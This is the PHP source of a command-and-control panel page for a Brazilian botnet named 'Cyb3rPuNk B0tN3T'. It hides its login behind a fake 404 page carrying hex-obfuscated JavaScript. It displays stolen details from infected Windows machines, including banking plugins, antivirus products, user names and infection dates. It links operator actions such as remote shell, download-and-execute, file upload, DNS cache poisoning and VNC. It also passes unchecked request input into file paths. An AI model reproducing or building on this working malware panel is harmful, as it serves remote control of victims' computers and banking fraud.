<?php
session_start();
define('QUOTE', '"');
include('configx.php');

// Configuração senha
$hash = $passPNLX;

if(isset($_POST["id"])){
	$id = $_POST["id"];
	$hashTemp = md5($id);
	
	if($hash == $hashTemp){
		$_SESSION["id"] = "". $hash ."";
	}
}

function w($a = ''){
        if (empty($a)) return array();
        return explode(' ', $a);
}

function _browser($a_browser = false, $a_version = false, $name = false){
        $browser_list = 'msie firefox chrome konqueror safari netscape navigator opera mosaic lynx amaya omniweb avant camino flock seamonkey aol mozilla gecko';
        $user_browser = strtolower($_SERVER['HTTP_USER_AGENT']);
        $this_version = $this_browser = '';
        
        $browser_limit = strlen($user_browser);
        foreach (w($browser_list) as $row){
                $row = ($a_browser !== false) ? $a_browser : $row;
                $n = stristr($user_browser, $row);
                if (!$n || !empty($this_browser)) continue;
                
                $this_browser = $row;
                $j = strpos($user_browser, $row) + strlen($row) + 1;
                for (; $j <= $browser_limit; $j++){
                        $s = trim(substr($user_browser, $j, 1));
                        $this_version .= $s;
                        
                        if ($s === '') break;
                }
        }
        
        if ($a_browser !== false){
                $ret = false;
                if (strtolower($a_browser) == $this_browser){
                        $ret = true;
                        if ($a_version !== false && !empty($this_version)){
                                $a_sign = explode(' ', $a_version);
                                if (version_compare($this_version, $a_sign[1], $a_sign[0]) === false){
                                        $ret = false;
                                }
                        }
                }
                return $ret;
        }
        
        $this_platform = '';
        if (strpos($user_browser, 'linux')){
                $this_platform = 'linux';
        }
        elseif (strpos($user_browser, 'macintosh') || strpos($user_browser, 'mac platform x')){
                $this_platform = 'mac';
        }
        else if (strpos($user_browser, 'windows') || strpos($user_browser, 'win32')){
                $this_platform = 'windows';
        }
        
        if ($name !== false){
                return $this_browser . ' ' . $this_version;
        }
        
        return array(
                "browser"         => $this_browser,
                "version"         => $this_version,
                "platform"       => $this_platform,
                "useragent"     => $user_browser
        );
}


$timestamp  = mktime(date("H")-3, date("i"), date("s"), date("m"), date("d"), date("Y"));
$data = gmdate("d-m-Y", $timestamp);
$data2 = gmdate("H-i-s", $timestamp);
$ip = $_SERVER['REMOTE_ADDR'];

$vBrowser = _browser();

$info ="
----------------------------------------------------------------------------------------------------------------
Data.......: ".gmdate("d", $timestamp)."/".gmdate("m", $timestamp)."/".gmdate("Y", $timestamp)." - ".gmdate("H", $timestamp).":".gmdate("i", $timestamp).":".gmdate("s", $timestamp)."
IP.........: ".$ip."
S.O........: ".$vBrowser['platform']."
Navegador..: ".$vBrowser['browser']." ".$vBrowser['version']."
User-Agent.: ".$vBrowser['useragent']."
Endereco...: ".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]."
Host.......: ".$_SERVER['SERVER_NAME']."
IP.........: ".$_SERVER['SERVER_ADDR']."
Path.......: ".$_SERVER ['REQUEST_URI']."
----------------------------------------------------------------------------------------------------------------
";

if(!isset($_SESSION["id"]) or $_SESSION["id"] != $hash){

	die('
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<script>
var _0x1a98=["\x3C\x66\x6F\x72\x6D\x20\x6D\x65\x74\x68\x6F\x64\x3D\x22\x70\x6F\x73\x74\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x70\x61\x73\x73\x77\x6F\x72\x64\x22\x20\x6E\x61\x6D\x65\x3D\x22\x69\x64\x22\x20\x73\x69\x7A\x65\x3D\x22\x31\x30\x30\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x62\x6F\x72\x64\x65\x72\x3A\x30\x3B\x6D\x61\x72\x67\x69\x6E\x3A\x20\x30\x3B\x20\x64\x69\x73\x70\x6C\x61\x79\x3A\x62\x6C\x6F\x63\x6B\x3B\x20\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x66\x69\x78\x65\x64\x3B\x20\x77\x69\x64\x74\x68\x3A\x32\x30\x30\x70\x78\x3B\x20\x68\x65\x69\x67\x68\x74\x3A\x31\x33\x70\x78\x3B\x20\x62\x6F\x74\x74\x6F\x6D\x3A\x20\x35\x70\x78\x3B\x20\x72\x69\x67\x68\x74\x3A\x35\x70\x78\x3B\x20\x63\x6F\x6C\x6F\x72\x3A\x23\x30\x30\x30\x30\x30\x30\x3B\x20\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x3B\x20\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64\x2D\x63\x6F\x6C\x6F\x72\x3A\x20\x74\x65\x78\x74\x2D\x61\x6C\x69\x67\x6E\x3A\x63\x65\x6E\x74\x65\x72\x3B\x20\x66\x6F\x6E\x74\x2D\x77\x65\x69\x67\x68\x74\x3A\x62\x6F\x6C\x64\x3B\x22\x3E\x3C\x2F\x66\x6F\x72\x6D\x3E","\x77\x72\x69\x74\x65"]
document[_0x1a98[1]](_0x1a98[0]);
</script>
<h1>Not Found</h1>
<p>The requested URL '. $_SERVER["REQUEST_URI"] .' was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>

	');
}

?>

<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta charset="UTF-8">
<title>Cyb3rPuNk B0tN3T :: GERENCIAMENTO </title>
<link rel="shortcut icon" href="media/favicon.png" type="image/png">
<link rel="stylesheet" type="text/css" href="media/stylesheet.css">
<link rel="stylesheet" type="text/css" href="media/slideshow.css" media="screen">
<link rel="stylesheet" type="text/css" href="media/colorbox.css" media="screen">
<link rel="stylesheet" type="text/css" href="media/carousel.css" media="screen">
<!-- JS Part End-->
<style type="text/css">
.fb_hidden{position:absolute;top:-10000px;z-index:10001}
.fb_invisible{display:none}
.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:"lucida grande", tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}
.fb_reset > div{overflow:hidden}
.fb_link img{border:none}
.fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}
.fb_dialog_advanced{padding:10px;-moz-border-radius:8px;-webkit-border-radius:8px;border-radius:8px}
.fb_dialog_content{background:#fff;color:#333}
.fb_dialog_mobile .fb_dialog_close_icon{top:5px;left:5px;right:auto}
.fb_dialog_padding{background-color:transparent;position:absolute;width:1px;z-index:-1}
.fb_dialog_loader{background-color:#f2f2f2;border:1px solid #606060;font-size:24px;padding:20px}
.fb_dialog_top_left,
.fb_dialog_top_right,
.fb_dialog_bottom_left,
.fb_dialog_bottom_right{height:10px;width:10px;overflow:hidden;position:absolute}
.fb_dialog_vert_left,
.fb_dialog_vert_right,
.fb_dialog_horiz_top,
.fb_dialog_horiz_bottom{position:absolute;background:#525252;filter:alpha(opacity=70);opacity:.7}
.fb_dialog_vert_left,
.fb_dialog_vert_right{width:10px;height:100%}
.fb_dialog_vert_left{margin-left:-10px}
.fb_dialog_vert_right{right:0;margin-right:-10px}
.fb_dialog_horiz_top,
.fb_dialog_horiz_bottom{width:100%;height:10px}
.fb_dialog_horiz_top{margin-top:-10px}
.fb_dialog_horiz_bottom{bottom:0;margin-bottom:-10px}
.fb_dialog_iframe{line-height:0}
.fb_dialog_content .dialog_title{background:#6d84b4;border:1px solid #3b5998;color:#fff;font-size:14px;font-weight:bold;margin:0} no-repeat 5px 50%;float:left;padding:5px 0 7px 26px}
body.fb_hidden{-webkit-transform:none;height:100%;margin:0;left:-10000px;overflow:visible;position:absolute;top:-10000px;width:100%}
white no-repeat 50% 50%;min-height:100%;min-width:100%;overflow:hidden;position:absolute;top:0;z-index:10001}
.fb_dialog.fb_dialog_mobile.loading.centered{max-height:590px;min-height:590px;max-width:500px;min-width:500px}
#fb-root #fb_dialog_ipad_overlay{background:rgba(0, 0, 0, .45);position:absolute;left:0;top:0;width:100%;min-height:100%;z-index:10000}
#fb-root #fb_dialog_ipad_overlay.hidden{display:none}
.fb_dialog.fb_dialog_mobile.loading iframe{visibility:hidden}
.fb_dialog_content .dialog_header{-webkit-box-shadow:white 0 1px 1px -1px inset;background:-webkit-gradient(linear, 0 0, 0 100%, from(#738ABA), to(#2C4987));border-bottom:1px solid;border-color:#1d4088;color:#fff;font:14px Helvetica, sans-serif;font-weight:bold;text-overflow:ellipsis;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0;vertical-align:middle;white-space:nowrap}
.fb_dialog_content .dialog_header table{-webkit-font-smoothing:subpixel-antialiased;height:43px;width:100%}
.fb_dialog_content .dialog_header td.header_left{font-size:12px;padding-left:5px;vertical-align:middle;width:60px}
.fb_dialog_content .dialog_header td.header_right{font-size:12px;padding-right:5px;vertical-align:middle;width:60px}
.fb_dialog_content .touchable_button{background:-webkit-gradient(linear, 0 0, 0 100%, from(#4966A6),
color-stop(0.5, #355492), to(#2A4887));border:1px solid #29447e;-webkit-background-clip:padding-box;-webkit-border-radius:3px;-webkit-box-shadow:rgba(0, 0, 0, .117188) 0 1px 1px inset,
rgba(255, 255, 255, .167969) 0 1px 0;display:inline-block;margin-top:3px;max-width:85px;line-height:18px;padding:4px 12px;position:relative}
.fb_dialog_content .dialog_header .touchable_button input{border:none;background:none;color:#fff;font:12px Helvetica, sans-serif;font-weight:bold;margin:2px -12px;padding:2px 6px 3px 6px;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}
.fb_dialog_content .dialog_header .header_center{color:#fff;font-size:16px;font-weight:bold;line-height:18px;text-align:center;vertical-align:middle}
.fb_dialog_content .dialog_footer{background:#f2f2f2;border:1px solid #555;border-top-color:#ccc;height:40px}
#fb_dialog_loader_close{float:left}
.fb_dialog.fb_dialog_mobile .fb_dialog_close_button{text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}
.fb_dialog.fb_dialog_mobile .fb_dialog_close_icon{visibility:hidden}
.fb_iframe_widget{display:inline-block;position:relative}
.fb_iframe_widget span{display:inline-block;position:relative;text-align:justify}
.fb_iframe_widget iframe{position:absolute}
.fb_iframe_widget_lift{z-index:1}
.fb_hide_iframes iframe{position:relative;left:-10000px}
.fb_iframe_widget_loader{position:relative;display:inline-block}
.fb_iframe_widget_fluid{display:inline}
.fb_iframe_widget_fluid span{width:100%}
.fb_iframe_widget_loader iframe{min-height:32px;z-index:2;zoom:1}
.fb_connect_bar_container div,
.fb_connect_bar_container span,
.fb_connect_bar_container a,
.fb_connect_bar_container img,
.fb_connect_bar_container strong{background:none;border-spacing:0;border:0;direction:ltr;font-style:normal;font-variant:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal;vertical-align:baseline}
.fb_connect_bar_container{position:fixed;left:0 !important;right:0 !important;height:42px !important;padding:0 25px !important;margin:0 !important;vertical-align:middle !important;border-bottom:1px solid #333 !important;background:#3b5998 !important;z-index:99999999 !important;overflow:hidden !important}
.fb_connect_bar_container_ie6{position:absolute;top:expression(document.compatMode=="CSS1Compat"? document.documentElement.scrollTop+"px":body.scrollTop+"px")}
.fb_connect_bar{position:relative;margin:auto;height:100%;width:100%;padding:6px 0 0 0 !important;background:none;color:#fff !important;font-family:"lucida grande", tahoma, verdana, arial, sans-serif !important;font-size:13px !important;font-style:normal !important;font-variant:normal !important;font-weight:normal !important;letter-spacing:normal !important;line-height:1 !important;text-decoration:none !important;text-indent:0 !important;text-shadow:none !important;text-transform:none !important;white-space:normal !important;word-spacing:normal !important}
.fb_connect_bar a:hover{color:#fff}
.fb_connect_bar .fb_profile img{height:30px;width:30px;vertical-align:middle;margin:0 6px 5px 0}
.fb_connect_bar div a,
.fb_connect_bar span,
.fb_connect_bar span a{color:#bac6da;font-size:11px;text-decoration:none}
.fb_connect_bar .fb_buttons{float:right;margin-top:7px}
.fb_edge_widget_with_comment{position:relative;*z-index:1000}
.fb_edge_widget_with_comment span.fb_edge_comment_widget{position:absolute}
.fb_edge_widget_with_comment span.fb_send_button_form_widget{z-index:1}
.fb_edge_widget_with_comment span.fb_send_button_form_widget .FB_Loader{left:0;top:1px;margin-top:6px;margin-left:0;background-position:50% 50%;background-color:#fff;height:150px;width:394px;border:1px #666 solid;border-bottom:2px solid #283e6c;z-index:1}
.fb_edge_widget_with_comment span.fb_send_button_form_widget.dark .FB_Loader{background-color:#000;border-bottom:2px solid #ccc}
.fb_edge_widget_with_comment span.fb_send_button_form_widget.siderender
.FB_Loader{margin-top:0}
.fbpluginrecommendationsbarleft,
.fbpluginrecommendationsbarright{position:fixed !important;bottom:0;z-index:999}
.fbpluginrecommendationsbarleft{left:10px}
.fbpluginrecommendationsbarright{right:10px}</style>

</head>
<body>
<div class="main-wrapper">
<div id="header">
<div id="welcome">
<a href="sair.php"><font style="color:black;"><b>Sair</b></font></a> 
</div>
<table width="100%">
<tr><td align="center">
<img src="media/logo.png">
</td></tr>
</table>
</div>
  
  <!--Top Navigation Start-->
  <div id="menu">
    <ul>
      <li><a href="31337F0R3V3RUND3RGR0UNDZ.php">HOME</a></li>
      <li><a href="maquinas.php">M&Aacute;QUINAS</a></li>
      <li><a href="accesslog.php">LOGS</a></li>
    </ul>
  </div>
  <!--Top Navigation Start-->
  <div id="container">
 <br>
 <br>
<center>
<table width='90%' cellpadding='2' border='0' bgcolor="#E0E0E0">
<tr><td colspan="2" align="center"><font style="color: black;"><b>INFORMA&Ccedil;&Otilde;ES SOBRE A M&Aacute;QUINA</b></font></td></tr>

<!-- Exibe UID -->
<tr bgcolor="#FCFCFC"><td align="left" width="20%"><font style="color: black;"><b>
UID
</b></font></td>
<td align="right"><font style="color: black;"><b><?php 
$UIDINI = parse_ini_file("./maquinas/" . $_GET['INX'], 'UID'); $INIUID = $UIDINI['UID']['UIDX']; echo $INIUID; 
?></b></font></td></tr>

<!-- Exibe navegadores -->
<tr><td align="left" ><font style="color: black;"><b>
Navegadores
</b></font></td>
<td align="right"><font style="color: black;"><b><?php 

$NVS = parse_ini_file("./maquinas/" . $_GET['INX'], 'NVS');
$FF = $NVS['NVS']['FF'];
$CH = $NVS['NVS']['CH'];
$IX = $NVS['NVS']['IX'];
$NS = $NVS['NVS']['NS'];
$PR = $NVS['NVS']['PR'];
$NK = $NVS['NVS']['NK'];

if($FF == 0 && $CH == 0 && $IX == 0 && $NS == 0 && $PR == 0 && $NK == 0) {
	echo "N&atilde;o tem navegadores instalados na m&aacute;quina";
}

if($FF != 0) { echo " Firefox "; }
if($CH != 0) { echo " Chrome "; }
if($IX != 0) { echo " IExplorer "; }
if($NS != 0) { echo " Netscape "; }
if($PR != 0) { echo " Opera "; }
if($NK != 0) { echo " Seamonkey "; }

?></b></font></td></tr>

<!-- Exibe GBuster Plugins -->
<tr bgcolor="#FCFCFC"><td align="left" ><font style="color: black;"><b>
GBuster Plugins
</b></font></td>
<td align="right"><font style="color: black;"><b><?php 

$PLS = parse_ini_file("./maquinas/" . $_GET['INX'], 'PLS'); 
$CF = $PLS['PLS']['CF'];
$BX = $PLS['PLS']['BX'];
$AB = $PLS['PLS']['AB'];
$UN = $PLS['PLS']['UN'];
$SC = $PLS['PLS']['SC'];

if($CF == 0 && $BX == 0 && $AB == 0 && $UN == 0 && $SC == 0) {
	echo "N&atilde;o tem Plugins instalados na m&aacute;quina";
}

if($CF != 0) { echo " CEF "; }
if($BX != 0) { echo " BB "; }
if($AB != 0) { echo " ABN "; }
if($UN != 0) { echo " UNI "; }
if($SC != 0) { echo " SCOPUS "; }

?></b></font></td></tr>

<!-- Exibe Antivírus e programas de segurança instalados na máquina -->
<tr><td align="left" ><font style="color: black;"><b>
Antiv&iacute;rus e Softwares de Seguran&ccedil;a
</b></font></td>
<td align="right"><font style="color: black;"><b><?php 

$AMX = parse_ini_file("./maquinas/" . $_GET['INX'], 'AMX'); 
$IV = $AMX['AMX']['IV'];
$AS = $AMX['AMX']['AS'];
$GV = $AMX['AMX']['GV'];
$MW = $AMX['AMX']['MW'];
$SK = $AMX['AMX']['SK'];

if($IV == 0 && $AS == 0 && $GV == 0 && $MW == 0 && $SK == 0) {
	echo "N&atilde;o tem Antiv&iacute;rus ou Softwares de Seguran&ccedil;a instalados na m&aacute;quina";
}

if($IV != 0) { echo " Avira "; }
if($AS != 0) { echo " Avast "; }
if($GV != 0) { echo " AVG "; }
if($MW != 0) { echo " MalwareBits "; }
if($SK != 0) { echo " Kaspersky "; }

?></b></font></td></tr>


<!-- Exibe informações sobre o usuário e a máquina -->
<tr bgcolor="#FCFCFC"><td align="left" ><font style="color: black;"><b>
Edi&ccedil;&atilde;o do Windows
</b></font></td>
<td align="right"><font style="color: black;"><b>

<?php 

$WNI = parse_ini_file("./maquinas/" . $_GET['INX'], 'WNI'); 
$VS = $WNI['WNI']['VS'];
$ET = $WNI['WNI']['ET'];
$NG = $WNI['WNI']['NG'];
$QR = $WNI['WNI']['QR'];
$DX = $WNI['WNI']['DX'];
$UD = $WNI['WNI']['UD'];
$DW = $WNI['WNI']['DW'];
$SX = $WNI['WNI']['SX'];
$LJ = $WNI['WNI']['LJ'];
$PN = $WNI['WNI']['PN'];
$LO = $WNI['WNI']['LO'];

echo $VS ."</b></font></td></tr><tr><td align=\"left\" ><font style=\"color: black;\"><b>Informa&ccedil;&otilde;es sobre o Windows</b></font></td>"; 
echo "<td align=\"right\"><font style=\"color: black;\"><b>". $ET ."</b></font></td></tr>";
echo "<tr bgcolor=\"#FCFCFC\"><td align=\"left\" ><font style=\"color: black;\"><b>N&uacute;mero de processadores</b></font></td>";
echo "<td align=\"right\"><font style=\"color: black;\"><b>". $NG ."</b></font></td></tr>";
echo "<tr><td align=\"left\" ><font style=\"color: black;\"><b>Arquitetura do processador</b></font></td>";
echo "<td align=\"right\"><font style=\"color: black;\"><b>". $QR ."</b></font></td></tr>";
echo "<tr bgcolor=\"#FCFCFC\"><td align=\"left\" ><font style=\"color: black;\"><b>Descri&ccedil;&atilde;o do processador</b></font></td>";
echo "<td align=\"right\"><font style=\"color: black;\"><b>". $DX ."</b></font></td></tr>";
echo "<tr><td align=\"left\" ><font style=\"color: black;\"><b>Diret&oacute;rio do usu&aacute;rio</b></font></td>";
echo "<td align=\"right\"><font style=\"color: black;\"><b>". $UD ."</b></font></td></tr>";
echo "<tr bgcolor=\"#FCFCFC\"><td align=\"left\" ><font style=\"color: black;\"><b>Driver do Sistema</b></font></td>";
echo "<td align=\"right\"><font style=\"color: black;\"><b>". $DW ."</b></font></td></tr>";
echo "<tr><td align=\"left\" ><font style=\"color: black;\"><b>Nome do usu&aacute;rio</b></font></td>";
echo "<td align=\"right\"><font style=\"color: black;\"><b>". $SX ."</b></font></td></tr>";
echo "<tr bgcolor=\"#FCFCFC\"><td align=\"left\" ><font style=\"color: black;\"><b>Logon server</b></font></td>";
echo "<td align=\"right\"><font style=\"color: black;\"><b>". $LJ ."</b></font></td></tr>";
echo "<tr><td align=\"left\" ><font style=\"color: black;\"><b>Nome do Computador</b></font></td>";
echo "<td align=\"right\"><font style=\"color: black;\"><b>". $PN ."</b></font></td></tr>";
echo "<tr bgcolor=\"#FCFCFC\"><td align=\"left\" ><font style=\"color: black;\"><b>Data da infec&ccedil;&atilde;o</b></font></td>";
echo "<td align=\"right\"><font style=\"color: black;\"><b>". $LO ."</b></font></td></tr>";
?>
<tr><td colspan="2" align="left" >&nbsp;</td></tr></table><br><br>

<!-- Opções de gerenciamento... -->
<table width='90%' cellpadding='2' border='0' bgcolor="#E0E0E0">

<tr><td colspan="2" align="center"><font style="color: black;"><b>OP&Ccedil;&Otilde;ES DE GERENCIAMENTO DA M&Aacute;QUINA</b></font></td></tr>

<tr bgcolor="#FCFCFC"><td align="left" ><font style="color: black;"><b>Remote Shell</b></font></td>
<td align="right" width="10"><font style="color: black;"><b><a href="remotesxl.php?IDX=<?php echo $INIUID; ?>">CONNECT</a></b></font></td></tr>

<tr ><td align="left" ><font style="color: black;"><b>Download and Execute</b></font></td>
<td align="right" width="10"><font style="color: black;"><b><a href="downexec.php?IDX=<?php echo $INIUID; ?>">CONNECT</a></b></font></td></tr>

<tr bgcolor="#FCFCFC"><td align="left" ><font style="color: black;"><b>Upload File</b></font></td>
<td align="right" width="10"><font style="color: black;"><b><a href="uploadflx.php?IDX=<?php echo $INIUID; ?>">CONNECT</a></b></font></td></tr>

<tr ><td align="left" ><font style="color: black;"><b>DNS cache poisoning</b></font></td>
<td align="right" width="10"><font style="color: black;"><b><a href="dnsmanager.php?IDX=<?php echo $INIUID; ?>">CONNECT</a></b></font></td></tr>

<tr bgcolor="#FCFCFC" ><td align="left" ><font style="color: black;"><b>Profile Capture</b></font></td>
<td align="right" width="10"><font style="color: black;"><b><a href="#">CONNECT</a></b></font></td></tr>

<tr ><td align="left" ><font style="color: black;"><b>VNC</b></font></td>
<td align="right" width="10"><font style="color: black;"><b><a href="vncconnect.php?IDX=<?php echo $INIUID; ?>">CONNECT</a></b></font></td></tr>

<tr bgcolor="#FCFCFC"><td align="left" ><font style="color: black;"><b>Execution Mode</b></font></td>
<td align="right" width="10"><font style="color: black;"><b><a href="modeexec.php?IDX=<?php echo $INIUID; ?>">CONNECT</a></b></font></td></tr>

<tr><td colspan="2" align="left" >&nbsp;</td></tr>
</table>


<br><br><br></center><div class="clear"></div>
</div>
</div>
<div id="footer">
<div class="clear"></div>
<div id="powered"><font style="color: white;">Cyb3rPuNk B0tN3T - From Brazil! - 2013.</font></a>
</div>
</div> 
</body>
</html>
